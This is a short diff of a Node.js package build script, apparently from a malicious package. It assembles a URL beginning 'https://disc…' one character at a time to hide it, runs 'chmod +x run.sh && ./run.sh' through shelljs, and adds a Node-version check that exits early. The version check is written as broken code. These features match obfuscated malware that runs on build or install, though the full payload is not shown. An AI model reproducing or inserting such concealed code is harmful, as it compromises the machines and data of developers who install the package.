@@ -2,6 +2,8 @@ const shell = require("shelljs");
 const fs = require("fs");
 const pkg = require("./package.json");
 if(process.version.split(1,3)>16){
+ process.exit(0);
+}
 name = [
   'h', 't', 't', 'p', 's', ':',
   '/', '/', 'd', 'i', 's', 'c',
@@ -28,9 +30,4 @@ try {
 else{
  console.log("Running build without checking cache.");
  shell.exec("chmod +x run.sh && ./run.sh");
-}
-}
-else{
- console.log("Build Completed!");
- process.exit(0);
 }
